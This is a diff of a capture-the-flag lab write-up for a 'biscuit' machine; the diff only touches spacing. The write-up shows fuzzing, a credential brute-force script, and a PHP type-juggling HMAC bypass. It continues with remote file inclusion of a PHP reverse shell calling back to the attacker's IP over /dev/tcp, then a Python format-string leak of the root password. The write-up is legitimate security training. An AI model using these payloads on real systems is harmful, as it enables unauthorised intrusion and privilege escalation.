@@ -28,7 +28,7 @@ PORT    STATE SERVICE VERSION
 |   100000  3,4          111/tcp6  rpcbind
 |_  100000  3,4          111/udp6  rpcbind
 ```
-<br>
+
 First, I performed fuzzing on the web application using `ffuf` and discovered a directory named `class`.
 ```bash
 ┌─[ribeirin@parrot]─[~/Documents/machines/hackingclub/biscuit]
@@ -58,14 +58,14 @@ ________________________________________________
 class                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 157ms]
 .                       [Status: 200, Size: 6773, Words: 862, Lines: 301, Duration: 151ms]
 ```
-<br>
+
 Upon accessing the application, I encountered a login page at the index.
 ![index login page](../images/biscuit/index_php.png)
-<br>
+
 So, I decided to verify the `/class` path and found something. This directory was exposed with a file named `Auth.class.php`. I tried to access the file to view its source code, but nothing happened.
 <br>
 ![directory exposed](../images/biscuit/class_directoryexposed.png)
-<br>
+
 I also tried to discover other paths and files, but I was unsuccessful.
 ## Exploitation
 Here, we have many vectors to explore. So, I decided to start with the web application. The first thing that came to mind was to explore the request using Type Juggling, as the backend is running PHP.
@@ -87,11 +87,11 @@ Priority: u=0, i
 
 username=teste&password=teste
 ```
-<br>
+
 Here, I tried modifying the parameters `username` and `password` to create a vector: `username[]` and `password[]`, but I didn’t succeed. Refs: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md), [PHP Type Juggling Vulnerability](https://medium.com/@abdelrahman0x01/php-type-juggling-vulnerability-768bca4d8b3b) and [PHP Magic Tricks: Type Juggling](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf).
-<br>
+
 I tried SQL Injection using `ghauri` and `sqlmap`, but the application wasn't vulnerable to SQLi.
-<br>
+
 The other thing I tried was a brute force attack to check if there were default credentials on the web application. I wrote a `python script` to do this. I used the following wordlists: for usernames, [top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt), and for passwords, [default-passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt), both from the SecLists repo.
 ```python
 import requests
@@ -118,10 +118,10 @@ def main():
 if __name__ == '__main__':
     main()
 ```
-<br>
+
 So, we found the default credentials: `guest:guest`. After logging in, we encountered the following page, which did not have any modules or functions to explore.
 ![guest page](../images/biscuit/guest_page.png)
-<br>
+
 But when we checked the `storage` section, we found a `JWT session cookie`.
 `eyJobWFjIjoiNDg5OWM3MTIxNWEzMDdlZGUwMjkyYjY3MGRhNDE5NTkiLCJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwaXJhdGlvbiI6MTczNTI0NjM2MX0=`
 
@@ -135,7 +135,7 @@ When we decode it with Base64, we get the following content:
 ```json
 {"hmac":"4899c71215a307ede0292b670da41959","username":"guest","expiration":1735246361}
 ```
-<br>
+
 Here, we have an HMAC to sign and validate the user `guest`. Ref: [JSON Web Token (JWT) Signing Algorithms Overview](https://auth0.com/blog/json-web-token-signing-algorithms-overview/). What happens if I try to change the `username` or `HMAC`?
 ```bash
 ┌─[ribeirin@parrot]─[~/Documents/machines/hackingclub/biscuit]
@@ -145,10 +145,10 @@ eyJobWFjIjoiNDg5OWM3MTIxNWEzMDdlZGUwMjkyYjY3MGRhNDE5NTkiLCJ1c2VybmFtZSI6MCwi ZXh
 ```
 
 Change the value of the session cookie and send the request again.
-<br>
+
 We have an error in our application with the following exception and the first flag: `Biscuit Security Exception, you've been blocked due to cookie tampering. Stop or your IP address will be banned!`.
 ![changing_username.png](../images/biscuit/changing_username.png)
-<br>
+
 We can see that the request passes through `Auth.class.php`. Now, we need to test the change on the `HMAC`.
 ```bash
 ┌─[ribeirin@parrot]─[~/Documents/machines/hackingclub/biscuit]
@@ -156,7 +156,7 @@ We can see that the request passes through `Auth.class.php`. Now, we need to tes
 
 eyJobWFjIjowLCJ1c2VybmFtZSI6MCwiZXhwaXJhdGlvbiI6MTczNTI0NjM2MX0K
 ```
-<br>
+
 When we made the request, the application returned a warning and an error:
 ```
 Warning: require_once(0.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 64
@@ -164,16 +164,16 @@ Warning: require_once(0.php): failed to open stream: No such file or directory i
 Fatal error: require_once(): Failed opening required '0.php' (include_path='.:/usr/share/pear:/usr/share/php') in /var/www/html/index.php on line 64
 ```
 ![changing_hmac.png](../images/biscuit/changing_hmac.png)
-<br>
+
 Here, we have a Type Juggling issue in the session cookie with the `hmac` parameter. After testing, we found a value that allows us to bypass the validation. We need to set `true` in the `hmac` parameter.
 
 We have a method inside `Auth_class.php` with `require_once(any_php_file.php)`. We can exploit this because it's essentially similar to the `include()` method in PHP. So, we need to pass our PHP shell file to `require_once`. Refs: [function.require-once.php](https://www.php.net/manual/en/function.require-once.php), [function.include.php](https://www.php.net/manual/en/function.include.php), and [PHP require_once Keyword](https://www.w3schools.com/php/keyword_require_once.asp).
-<br>
+
 I created a PHP file called `shell.php` with:
 ```php
 <?php system("/bin/bash -c 'sh -i >& /dev/tcp/10.0.10.235/4444 0>&1'"); ?>
 ```
-<br>
+
 And now, we just need to create a local server with Python and send the request with the `hmac` parameter. Note: We don't need to add the PHP extension at the end of the URL.
 ```bash
 ┌─[ribeirin@parrot]─[~/Documents/machines/hackingclub/biscuit]
@@ -181,7 +181,7 @@ And now, we just need to create a local server with Python and send the request 
 eyJobWFjIjp0cnVlLCJ1c2VybmFtZSI6Imh0dHA6Ly8xMC4wLjEwLjIzNTo4MDAwL3NoZWxsIiwi
 ZXhwaXJhdGlvbiI6MTczNTI0NjM2MX0K
 ```
-<br>
+
 And voilà, we got a reverse shell! Now, we just need to get a full TTY.
 <br>
 ![reverse_shell.png](../images/biscuit/reverse_shell.png)
@@ -203,19 +203,19 @@ Matching Defaults entries for apache on ip-172-16-2-123:
 User apache may run the following commands on ip-172-16-2-123:
     (ALL) NOPASSWD: /opt/biscuit_checker.py
 ```
-<br>
+
 Basically, this file just blocks an IP from a single file located at `/var/www/html/block.ips.db.json` and prints the list of blocked IPs.
 ![python_file_1.png](../images/biscuit/python_file_1.png)
-<br>
+
 Inside `block.ips.db.json`, we have a JSON file with a list of IPs to block. So, we can edit this file to add whatever we want. To test, I'll modify it to `{"ips":[test]}`.
 <br>
 ![python_file_2.png](../images/biscuit/python_file_2.png)
-<br>
+
 After the test, we can see that there is a method called `ip_blocked()` inside `ip`. So, here I can access the internal attributes using a Format String vulnerability. Refs: [Can Python's string .format() be made safe for untrusted format strings?](https://stackoverflow.com/questions/15356649/can-pythons-string-format-be-made-safe-for-untrusted-format-strings), [Is format string still an issue in Python?](https://security.stackexchange.com/questions/269949/is-format-string-still-an-issue-in-python) and [Testing for Format String](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.3-Testing_for_Format_String)
-<br>
+
 `{"ips":["{ip.list_blocked.__globals__}"]}`
-<br>
+
 After modifying, we were able to access the internal variables and found the root password: `Th1s_1s_Sup3r_S3cr3t_R00t_K3y`.
 ![python_file_3.png](../images/biscuit/python_file_3.png)
-<br>
+
 Now, just switch to the root user and got the flag =D.
